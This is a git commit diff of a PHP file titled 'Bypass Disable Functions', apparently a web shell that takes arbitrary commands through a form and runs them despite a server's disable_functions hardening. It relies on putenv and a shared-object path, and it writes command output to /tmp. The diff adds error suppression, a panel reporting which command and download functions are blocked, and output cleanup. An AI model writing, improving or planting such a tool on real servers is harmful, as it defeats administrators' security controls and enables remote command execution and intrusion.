a6bbb2738c4e76e12256b0f1db8f6803109d5114
Azum Kholishul Fikri <azum.kholishul1408@gmail.com>
2023-12-21 14:02:55 +0700

    Update bdf.php

--- bdf.php
+++ bdf.php
@@ -1,4 +1,6 @@
 <?php
+// disable error reporting
+error_reporting(0);
 // Handle API request
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     header('Content-Type: application/json');
@@ -33,11 +35,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     // Execute the command and get output
     $response['output'] = nl2br(file_get_contents($out_path));
+    // remove <br> tag from output using strip_tags
+    $response['output'] = strip_tags($response['output']);
+    trim($response['output']);
     $response['so_path'] = $so_path;
 
     // Remove the output file
     unlink($out_path);
-
     echo json_encode($response, JSON_PRETTY_PRINT);
     exit; // Stop further execution
 }
@@ -49,10 +53,31 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Bootstrap Demo</title>
+    <title>Bypass Disable Functions</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    <style>
+        /* Gaya umum untuk semua browser */
+        ::-webkit-scrollbar {
+            width: 8px;
+            /* Atur lebar scrollbar */
+        }
+
+        /* Gaya untuk Firefox */
+        /* (Firefox memiliki properti tersendiri) */
+        * {
+            scrollbar-width: thin;
+        }
+    </style>
 </head>
 <?php
+
+function func_is_disabled($name)
+{
+    $disabled = explode(',', ini_get('disable_functions'));
+    // remove space from array
+    $disabled = array_map('trim', $disabled);
+    return in_array($name, $disabled);
+}
 $architecture = isset($_SERVER['PROCESSOR_ARCHITECTURE']) ? $_SERVER['PROCESSOR_ARCHITECTURE'] : '';
 $arch = "";
 if ($architecture == "x86") {
@@ -61,90 +86,136 @@ if ($architecture == "x86") {
     $arch = "x64";
 }
 // handle if php_uname() is disabled
-if (function_exists('php_uname')) {
-    $uname = php_uname();
-} else {
+if (func_is_disabled('php_uname')) {
     $uname = "<strong>php_uname()</strong> is disabled.";
+} else {
+    $uname = php_uname();
+}
+
+// check if putenv() is disabled or not
+if (func_is_disabled('putenv')) {
+    $putenv = false;
+} else {
+    $putenv = true;
 }
 ?>
 
 <body>
     <div class="container mt-3">
-        <h2 class="mb-4 text-center">Bypass Disable Function</h2>
-        <form method="post" id="apiForm">
-            <div class="mb-3">
-                <table class="table table-bordered">
-                    <thead>
-                        <tr>
-                            <th scope="col" style="width: 30%">Variable</th>
-                            <th scope="col">Value</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <tr>
-                            <th>System</th>
-                            <td><?php echo $uname; ?></td>
-                        </tr>
-                        <tr>
-                            <th>Architecture</th>
-                            <td><?php echo $arch; ?></td>
-                        </tr>
-                        <tr>
-                            <th>Disable Function</th>
-                            <td class="text-danger">
-                                <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#exampleModal">
-                                    View All
-                                </button>
-                            </td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-            <div class="mb-3">
-                <label for="cmd" class="form-label">Command:</label>
-                <!-- <input type="text" class="form-control" id="cmd" name="cmd" placeholder="Enter command" required> make autofocus also-->
-                <input type="text" class="form-control" id="cmd" name="cmd" value="ls -la" placeholder="Enter command" required autofocus>
-            </div>
+        <h2 class="mb-4 text-center">Bypass Disable Functions</h2>
+        <div class="mb-3">
+            <table class="table table-bordered">
+                <tbody>
+                    <tr>
+                        <th>System</th>
+                        <td><?php echo $uname; ?></td>
+                    </tr>
+                    <tr>
+                        <th>Disable Functions</th>
+                        <td class="text-danger">
+                            <button type="button" class="btn btn-primary btn-sm" data-bs-toggle="modal" data-bs-target="#exampleModal">
+                                View All
+                            </button>
+                        </td>
+                    </tr>
 
-            <div class="mb-3">
-                <label for="outpath" class="form-label">Output Path:</label>
-                <input type="text" class="form-control" id="outpath" name="outpath" value="/tmp/xx.txt" placeholder="Enter output path" required>
-            </div>
-
-            <div class="mb-3">
-                <label class="form-label">Architecture:</label>
-                <?php
-                // auto check radio button based on architecture value
-                if ($arch == "x86") {
-                    echo '<div class="form-check">';
-                    echo '<input class="form-check-input" type="radio" name="architecture" id="x86" value="x86" checked>';
-                    echo '<label class="form-check-label" for="x86">x86</label>';
-                    echo '</div>';
-                    echo '<div class="form-check">';
-                    echo '<input class="form-check-input" type="radio" name="architecture" id="x64" value="x64">';
-                    echo '<label class="form-check-label" for="x64">x64</label>';
-                    echo '</div>';
-                } else {
-                    echo '<div class="form-check">';
-                    echo '<input class="form-check-input" type="radio" name="architecture" id="x86" value="x86">';
-                    echo '<label class="form-check-label" for="x86">x86</label>';
-                    echo '</div>';
-                    echo '<div class="form-check">';
-                    echo '<input class="form-check-input" type="radio" name="architecture" id="x64" value="x64" checked>';
-                    echo '<label class="form-check-label" for="x64">x64</label>';
-                    echo '</div>';
-                }
-                ?>
-            </div>
-
-            <button type="submit" class="btn btn-primary" id="sbmtbtn">Submit</button>
-        </form>
-
-        <div class="mt-4 mb-3">
-            <h2>Result:</h2>
-            <!-- <div id="result" class="bg-white text-dark p-3"></div> make rounded also -->
-            <div id="result" class="bg-white text-dark p-3 rounded"></div>
+                    <tr>
+                        <th>putenv()</td>
+                        <td><span class="btn btn-sm <?php echo $putenv ? "btn-success" : "btn-danger"; ?>"><?php echo $putenv ? "Enabled" : "Disabled"; ?></span> | <span class="text-muted">putenv() is required to bypass disable_functions.</span></td>
+                    </tr>
+                    <tr>
+                        <th>Command </td>
+                        <td>
+                            <div class="d-flex gap-2 justify-content-start">
+                                <!-- <button class="btn btn-primary rounded-pill px-3" type="button">Primary</button> -->
+                                <span class="btn btn-sm <?php echo func_is_disabled('system') ? "btn-danger" : "btn-success"; ?>">system</span>
+                                <span class="btn btn-sm <?php echo func_is_disabled('exec') ? "btn-danger" : "btn-success"; ?>">exec</span>
+                                <span class="btn btn-sm <?php echo func_is_disabled('shell_exec') ? "btn-danger" : "btn-success"; ?>">shell_exec</span>
+                                <span class="btn btn-sm <?php echo func_is_disabled('passthru') ? "btn-danger" : "btn-success"; ?>">passthru</span>
+                                <span class="btn btn-sm <?php echo func_is_disabled('mail') ? "btn-danger" : "btn-success"; ?>">mail</span>
+                                <!-- phpinfo -->
+                                <span class="btn btn-sm <?php echo func_is_disabled('phpinfo') ? "btn-danger" : "btn-success"; ?>">phpinfo</span>
+                            </div>
+                        </td>
+                    </tr>
+                    <tr>
+                        <th>Downloader </td>
+                        <td>
+                            <div class="d-flex gap-2 justify-content-start">
+                                <!-- <button class="btn btn-primary rounded-pill px-3" type="button">Primary</button> -->
+                                <span class="btn btn-sm <?php echo func_is_disabled('curl') ? "btn-danger" : "btn-success"; ?>">curl</span>
+                                <span class="btn btn-sm <?php echo func_is_disabled('fopen') ? "btn-danger" : "btn-success"; ?>">fopen</span>
+                                <span class="btn btn-sm <?php echo func_is_disabled('readfile') ? "btn-danger" : "btn-success"; ?>">readfile</span>
+                                <span class="btn btn-sm <?php echo func_is_disabled('file_get_contents') ? "btn-danger" : "btn-success"; ?>">file_get_contents</span>
+                                <span class="btn btn-sm <?php echo func_is_disabled('file_put_contents') ? "btn-danger" : "btn-success"; ?>">file_put_contents</span>
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
         </div>
+        <div class="row">
+            <div class="col-md">
+                <form method="post" id="apiForm">
+                    <div class="mb-3">
+                        <label for="cmd" class="form-label">Command:</label>
+                        <!-- <input type="text" class="form-control" id="cmd" name="cmd" placeholder="Enter command" required> make autofocus also-->
+                        <input type="text" class="form-control" id="cmd" name="cmd" value="id" placeholder="Enter command" required autofocus>
+                    </div>
+
+                    <div class="mb-3">
+                        <label for="outpath" class="form-label">Output Path:</label>
+                        <input type="text" class="form-control" id="outpath" name="outpath" value="/tmp/xx.txt" placeholder="Enter output path" required>
+                    </div>
+
+                    <div class="mb-3">
+                        <label class="form-label">Architecture:</label>
+                        <?php
+                        // auto check radio button based on architecture value
+                        if ($arch == "x86") {
+                            echo '<div class="form-check">';
+                            echo '<input class="form-check-input" type="radio" name="architecture" id="x86" value="x86" checked>';
+                            echo '<label class="form-check-label" for="x86">x86</label>';
+                            echo '</div>';
+                            echo '<div class="form-check">';
+                            echo '<input class="form-check-input" type="radio" name="architecture" id="x64" value="x64">';
+                            echo '<label class="form-check-label" for="x64">x64</label>';
+                            echo '</div>';
+                        } else {
+                            echo '<div class="form-check">';
+                            echo '<input class="form-check-input" type="radio" name="architecture" id="x86" value="x86">';
+                            echo '<label class="form-check-label" for="x86">x86</label>';
+                            echo '</div>';
+                            echo '<div class="form-check">';
+                            echo '<input class="form-check-input" type="radio" name="architecture" id="x64" value="x64" checked>';
+                            echo '<label class="form-check-label" for="x64">x64</label>';
+                            echo '</div>';
+                        }
+                        ?>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary" id="sbmtbtn">Submit</button>
+                </form>
+            </div>
+            <div class="col-md">
+                <div class="mb-3">
+
+                    <label for="cmd" class="form-label">Result:</label>
+                    <textarea id="result" class=" form-control overflow-auto p-3 rounded" style="height: 250px; overflow: auto;" readonly></textarea>
+                </div>
+            </div>
+        </div>
+        <div class="row">
+            <!-- footer -->
+            <div class="col-md">
+                <footer class="pt-3 text-center mt-3 text-muted">
+                    Made with <span class="text-danger">❤</span> by <i><strong>Azusa.id</strong></i>
+                </footer>
+            </div>
+        </div>
+
+
+
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
@@ -153,6 +224,10 @@ if (function_exists('php_uname')) {
             event.preventDefault();
             disableSubmitButton();
             makeApiRequest();
+
+            // clear command and auto focus
+            document.getElementById("cmd").value = "";
+            document.getElementById("cmd").focus();
         });
 
         function disableSubmitButton() {
